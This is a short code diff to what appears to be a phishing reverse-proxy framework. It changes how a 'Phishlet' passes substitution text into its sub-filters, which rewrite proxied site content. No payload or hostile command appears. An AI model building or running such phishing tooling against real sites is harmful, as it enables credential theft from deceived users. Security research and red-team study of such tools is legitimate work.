@@ -496,7 +496,7 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 				*sf.Replace = content_groups[1] + content + content_groups[4]
 			}
 
-			p.addSubFilter(p.paramVal(*sf.Hostname), p.paramVal(*sf.Sub), p.paramVal(*sf.Domain), *sf.Path, *sf.Mimes, p.paramVal(*sf.Search), p.paramVal(*sf.Replace), sf.RedirectOnly, *sf.WithParams)
+			p.addSubFilter(p.paramVal(*sf.Hostname), p.paramVal(*sf.Sub), p.paramVal(*sf.Domain), *sf.Path, *sf.Mimes, p.paramVal(*sf.Search), *sf.Replace, sf.RedirectOnly, *sf.WithParams)
 		}
 	}
 	if fp.JsInject != nil {
